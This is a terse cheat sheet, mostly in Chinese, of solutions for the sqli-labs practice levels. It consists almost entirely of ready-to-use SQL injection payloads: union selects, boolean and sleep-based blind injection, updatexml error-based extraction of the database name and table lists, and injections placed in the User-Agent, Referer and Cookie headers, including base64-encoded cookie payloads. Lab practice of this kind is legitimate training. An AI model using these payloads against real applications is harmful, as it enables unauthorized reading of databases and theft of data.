### Sqllabs

1. `-1%27%20union%20select%201,2,3--+`

2. `-1%20union%20select%201,2,3--+`

3. `-1%27)%20union%20select%201,2,3--+`

4. `-1")%20union%20select%201,2,3--+`

5. `1%27%20and%20if(substr((database()),1,1)=%27s%27,1,0)--+`

5. `1"%20and%20if(substr((database()),1,1)=%27s%27,1,0)--+`

5. 利用文件操作函数将结果写入文件

5. `1%27%20and%20if(substr((database()),1,1)=%27s%27,1,0)--+`

5. `1%27%20and%20if(substr((database()),1,1)=%27s%27,sleep(5),0)--+`

5. `1"%20and%20if(substr((database()),1,1)=%27s%27,sleep(5),0)--+`

5. `1"%20and%20if(substr((database()),1,1)=%27s%27,1,0)--+`

12. `1") union select database(),2--+("`

13. `1') union select 1,2--+('`

    `1') union select group_concat(table_name) from information_schema.tables where 1=1 and updatexml(1,concat(0x7e,(database()),0x7e),1)--+('`

14. `" union select group_concat(table_name) from information_schema.tables where 1=1 and updatexml(1,concat(0x7e,(database()),0x7e),1)--+"`

15. `' or if(substr((database()),1,1)='s',sleep(5),0)--+'`

16. `") or if(substr((database()),1,1)='s',sleep(5),0)--+("`

    对于以上两种(15,16)盲注，要使用or链接
    
17. `1' and updatexml(1,concat(0x7e,(database()),0x7e),1)#`

18. 登陆成功时，会出现你的User-agent信息，在User-agent处写入`', '', updatexml(1,concat(0x7e,(database()),0x7e),1))#`

19. 登陆成功时，会出现你的Referer信息，在Referer处写入`', '', updatexml(1,concat(0x7e,(database()),0x7e),1))#`

20. 登陆成功时，会出现你的Cookie信息，在Cookie处写入`'and updatexml (1,concat(0x7e,(database()),0x7e),1)#`

21. 登陆成功时，会出现经base64编码的cookie信息，在Cookie处写入base64编码后的payload：`JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSwweDdlKSwxKSM=`

22. 登录成功时，会出现经base64编码的cookie信息，在Cookie处写入加双引号的base64编码后的payload：

    `IiB1bmlvbiBzZWxlY3QgMSwyLDMj`

23. 注释符不生效被替换，把前后单引号都闭合即可`1%27%20or%20updatexml(1,concat(0x7e,(database()),0x7e),1)%20or%20%27`

24. 

